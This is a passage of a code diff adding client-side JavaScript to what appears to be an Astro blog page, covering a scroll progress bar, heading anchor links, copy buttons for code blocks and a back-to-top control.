+    progressBar.id = "myBar";
+
+    // Append the progress bar to the progress container
+    progressContainer.appendChild(progressBar);
+
+    // Append the progress container to the document body or any other desired parent element
+    document.body.appendChild(progressContainer);
+  }
+  createProgressBar();
+
+  /** Update the progress bar
+   *  when user scrolls */
+  function updateScrollProgress() {
+    document.addEventListener("scroll", () => {
+      const winScroll =
+        document.body.scrollTop || document.documentElement.scrollTop;
+      const height =
+        document.documentElement.scrollHeight -
+        document.documentElement.clientHeight;
+      const scrolled = (winScroll / height) * 100;
+      if (document) {
+        const myBar = document.getElementById("myBar");
+        if (myBar) {
+          myBar.style.width = scrolled + "%";
+        }
+      }
+    });
+  }
+  updateScrollProgress();
+
+  /** Attaches links to headings in the document,
+   *  allowing sharing of sections easily */
+  function addHeadingLinks() {
+    const headings = Array.from(
+      document.querySelectorAll("h2, h3, h4, h5, h6")
+    );
+    for (const heading of headings) {
+      heading.classList.add("group");
+      const link = document.createElement("a");
+      link.className =
+        "heading-link ml-2 opacity-0 group-hover:opacity-100 focus:opacity-100";
+      link.href = "#" + heading.id;
+
+      const span = document.createElement("span");
+      span.ariaHidden = "true";
+      span.innerText = "#";
+      link.appendChild(span);
+      heading.appendChild(link);
+    }
+  }
+  addHeadingLinks();
+
+  /** Attaches copy buttons to code blocks in the document,
+   * allowing users to copy code easily. */
+  function attachCopyButtons() {
+    const copyButtonLabel = "Copy";
+    const codeBlocks = Array.from(document.querySelectorAll("pre"));
+
+    for (const codeBlock of codeBlocks) {
+      const wrapper = document.createElement("div");
+      wrapper.style.position = "relative";
+
+      const copyButton = document.createElement("button");
+      copyButton.className =
+        "copy-code absolute right-3 -top-3 rounded bg-muted px-2 py-1 text-xs leading-4 text-foreground font-medium";
+      copyButton.innerHTML = copyButtonLabel;
+      codeBlock.setAttribute("tabindex", "0");
+      codeBlock.appendChild(copyButton);
+
+      // wrap codebock with relative parent element
+      codeBlock?.parentNode?.insertBefore(wrapper, codeBlock);
+      wrapper.appendChild(codeBlock);
+
+      copyButton.addEventListener("click", async () => {
+        await copyCode(codeBlock, copyButton);
+      });
+    }
+
+    async function copyCode(block, button) {
+      const code = block.querySelector("code");
+      const text = code?.innerText;
+
+      await navigator.clipboard.writeText(text ?? "");
+
+      // visual feedback that task is completed
+      button.innerText = "Copied";
+
+      setTimeout(() => {
+        button.innerText = copyButtonLabel;
+      }, 700);
+    }
+  }
+  attachCopyButtons();
+
+  /** Scrolls the document to the top when
+   * the "Back to Top" button is clicked. */
+  function backToTop() {
+    document.querySelector("#back-to-top")?.addEventListener("click", () => {
+      document.body.scrollTop = 0; // For Safari
+      document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
+    });
+  }
+  backToTop();
+
+  /* Go to page start after page swap */
+  document.addEventListener("astro:after-swap", () =>
+    window.scrollTo({ left: 0, top: 0, behavior: "instant" })
+  );
+</script>
